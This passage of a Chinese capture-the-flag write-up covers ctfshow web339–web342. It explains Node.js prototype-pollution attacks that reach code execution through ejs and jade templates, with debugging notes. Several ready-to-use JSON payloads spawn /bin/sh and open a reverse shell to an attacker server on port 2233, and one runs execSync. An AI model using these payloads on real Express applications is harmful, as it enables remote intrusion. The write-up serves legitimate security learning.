data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796551640-9d0beceb-3b78-4a2e-b77f-19ea45c2cecd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796495423-4c858c2e-cbf8-4c26-96f1-35206b50b05f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796495423-4c858c2e-cbf8-4c26-96f1-35206b50b05f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>仔细对比了一下，发现了，感觉是命名空间问题，即 <code>require</code> 可能不被识别，尝试把 require 改为 <code>global.process.mainModule.constructor._load</code> ，同样服务器监听端口为 <code>2233</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>也是先 POST /login 接口污染 <code>query</code> 对象</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838195166-c3b39c68-4095-4a87-b5b4-793e3c217290.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838195166-c3b39c68-4095-4a87-b5b4-793e3c217290.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>访问下 /api 接口</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838256467-488bab08-9d13-4910-bfcf-2d833730b60d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838256467-488bab08-9d13-4910-bfcf-2d833730b60d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>反弹 shell 并获取 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838313191-f653eafe-5665-48af-8b1b-ca85b765776c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838313191-f653eafe-5665-48af-8b1b-ca85b765776c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后顺便翻了个链接，好像确实如此~</p><p><a href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p><p>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</p><p>还有一个其他解，见 web338 中的 <code>ejs</code> RCE，一样的EXP、步骤和利用方式</p><h2 id="web340-原型连污染"><a href="#web340-原型连污染" class="headerlink" title="web340 原型连污染 ++"></a>web340 原型连污染 ++</h2><span class='btn'><a class="button"  title='nodejs/v10.19.0'><i class='fas fa-tag'></i>nodejs/v10.19.0</a></span><p>题目描述处蓝奏云下载源码</p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619848191941-9137aba3-47fd-43b8-a3d5-7a2ff56cf183.zip">📎web340.zip</a></p><p>提取关键部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.copy(user.userinfo,req.body);</span><br><span class="line"><span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849651649-5929789d-e0ee-40c1-b64a-260dbf694cc8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849651649-5929789d-e0ee-40c1-b64a-260dbf694cc8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发现 <code>userinfo</code> 的原型不是 <code>Object</code> 对象， <code>userinfo.__proto__.__proto__</code> 才是 <code>Object</code> 对象。</p><p>和 web339 一样，只不过要套两层才能污染 <code>Object</code> 对象，同样用原生 socket，服务端监听端口为 <code>2233</code> （</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>同样 POST 一下 /login 接口污染 <code>query</code> 对象</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849998642-a34ea0a4-6247-469e-8fc4-a54cfc2c3f04.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849998642-a34ea0a4-6247-469e-8fc4-a54cfc2c3f04.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>POST 一下 /api 接口触发</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850047162-862e293e-40a1-426a-8f9b-986bdc9f5cb7.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850047162-862e293e-40a1-426a-8f9b-986bdc9f5cb7.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>获取 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850088128-88f3102a-4583-480c-9554-49acb497f2ac.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619850088128-88f3102a-4583-480c-9554-49acb497f2ac.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web341-原型链污染"><a href="#web341-原型链污染" class="headerlink" title="web341 原型链污染 +++"></a>web341 原型链污染 +++</h2><p>题目描述处蓝奏云下载源码</p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619850192491-23fb3969-02f6-4e21-9ec9-8b8f88691980.zip">📎web341.zip</a></p><p>这题和其他不同的是没有 <code>/api</code> 接口触发污染点了，所以使用 web338 中的 <code>ejs</code> RCE。</p><p>然后像 web340 一样污染要套两层。下面 EXP 也服务器监听端口是 <code>2233</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>注意这里的前面的 <code>_tmp1;</code> 和后面的 <code>var __tmp2</code> 不能删，web338 <a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">evil0</a> 的分析有体现到，是为了闭合代码。</p><p>同样 POST 一下 /login 接口污染数据</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851677820-b1f46669-6efd-438f-951a-985b79fe47a4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851677820-b1f46669-6efd-438f-951a-985b79fe47a4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后请求一个会调用 <code>render</code> 方法的接口</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851738320-0ec2f215-6519-436e-bb0c-23c3bd68dd09.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851738320-0ec2f215-6519-436e-bb0c-23c3bd68dd09.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>即可获得 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851757626-20f8d982-09e9-44d2-9d6c-b1a67c5aed51.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619851757626-20f8d982-09e9-44d2-9d6c-b1a67c5aed51.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web342-原型链污染"><a href="#web342-原型链污染" class="headerlink" title="web342 原型链污染 ++++"></a>web342 原型链污染 ++++</h2><p>题目描述处蓝奏云下载源码</p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619851833054-73b176d1-8460-439c-b5a4-bfe106363cda.zip">📎web342.zip</a></p><p>然后还有个提示</p><blockquote><p>审计了1个小时发现的，此链目前网上未公开，难度稍大</p></blockquote><p>本题就不是用 <code>ejs</code> 进行模板渲染了，而是使用了 <code>jade</code></p><p>一开始想看其他师傅的文章</p><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><p>emm，但是发现说的每个字都认识，连起来就觉得有点莫名其妙了。。于是想着先自己手动分析一下，熟悉一波，方便自己和师傅在同一个频道上，防止师傅说的每句话都感觉莫名其妙…</p><p>详细的断点分析参考</p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p><p>这里用 VS Code 来 debug 分析</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854278042-c637cf51-7238-480e-84dd-f49d977bf14c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854278042-c637cf51-7238-480e-84dd-f49d977bf14c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>就会自动创建这样一个文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pwa-node&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Launch Program&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;skipFiles&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;&lt;node_internals&gt;/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/bin/www&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后下个断点，运行一下，访问网页就可以开始愉快的 debug 了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854350300-e85ce972-6f11-4105-86ea-ceec77a7a079.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854350300-e85ce972-6f11-4105-86ea-ceec77a7a079.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>这里直接用 ctfshow web342 的代码进行</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854418013-7df0201d-5afd-4fa6-867d-91c75397438f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619854418013-7df0201d-5afd-4fa6-867d-91c75397438f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>依次进入 <code>res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856672860-52054ba9-715c-4171-9cf2-f485f64e9450.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856672860-52054ba9-715c-4171-9cf2-f485f64e9450.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>入口是 <code>rederFile</code> 方法，注意 <code>renderFile</code> 函数返回值可执行</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856772234-91b25d6c-3375-4d2d-8f9e-2abba085d1f4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856772234-91b25d6c-3375-4d2d-8f9e-2abba085d1f4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>进入 <code>handleTemplateCache</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856901774-19728d60-fe53-4909-8585-1e8a528a6e2e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619856901774-19728d60-fe53-4909-8585-1e8a528a6e2e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>进入 <code>compile</code> 函数</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619858466276-d82584d9-6d7a-4596-9e3d-6562eb0ab828.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619858466276-d82584d9-6d7a-4596-9e3d-6562eb0ab828.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>205行 有个 <code>parse</code> 解析，可以看到结果返回到 <code>parsed</code>，又传递给了 <code>fn</code>，先不管 <code>parse</code> 方法，继续向下看代码</p><p>218行 这里就比较有趣了，有个看似可控的代码执行（new Function，这个在 web339 有提到）</p><p>进入 <code>parse</code> 看看返回值中是否有可控部分</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867701016-f7cb858e-1918-4175-9dbf-ea13194759fb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867701016-f7cb858e-1918-4175-9dbf-ea13194759fb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><code>parse</code> 方法内部可以看到先内部 <code>parse</code> 再内部 <code>compile</code>，内部 <code>parse</code> 结果最终会被拼接到外层 <code>parse</code> 函数返回值部分</p><p>即 114行的 <code>js对象</code> 被拼接到 148行 或 149行的 <code>js对象</code> 里，最终拼接到 <code>body键</code> 返回</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867784532-85765a8b-e580-44a3-83f6-f2cba0b44a17.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867784532-85765a8b-e580-44a3-83f6-f2cba0b44a17.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>先跟进 <code>114行</code> 的 <code>compile</code> 方法，发现本方法返回的是 <code>buf</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867921514-76f56262-dd87-4e1c-9aac-719ca84ce527.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619867921514-76f56262-dd87-4e1c-9aac-719ca84ce527.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>跟进 66行的 <code>this.visit(this.node);</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619868103558-5ad3d284-46a1-4346-afeb-9f84dafbb60b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619868103558-5ad3d284-46a1-4346-afeb-9f84dafbb60b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发现可控（因为 <code>node.filename</code> 被 <code>utils.stringify()</code> 了）的 <code>node.line</code> 可以被 <code>push</code> 到 <code>buf</code> 中，条件是 <code>this.debug=true</code></p><p>然后在 212行的 <code>this.visitNode(node);</code> 去遍历 ast 树，遍历完后回到 <code>compile</code> 方法</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619874182215-9b53b14d-ced5-4573-9e05-d5a0d55bf0cd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619874182215-9b53b14d-ced5-4573-9e05-d5a0d55bf0cd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>可以看到 <code>node.line</code> 被记录到 fn 中，然后通过 <code>Function</code> 调用执行这部分代码。</p><p>也就是说如果我们可以污染 <code>node.line</code> 就可以运行我们代码。</p><p>也就是说 <code>jade</code> 本身是没有漏洞的，因为模板的渲染逻辑是如何，但问题是，如果存在可控的原型链污染，就可以帮助我们污染 <code>node.line</code> 。</p><p>于是尝试 POST <code>/login</code> 接口</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>断点发现，， <code>node.line</code> 值还是 <code>0</code>、<code>1</code>、<code>2</code> 之类的？</p><p>突然醒悟，，还有一个问题，我们在调试过程中发现，<code>node.line</code> 是存在值的，比如上图中的 <code>0</code>、<code>1</code>、<code>2</code> ，如果存在值的话，它会直接获取这个值，而不是获取我们污染过的 <code>Object</code> 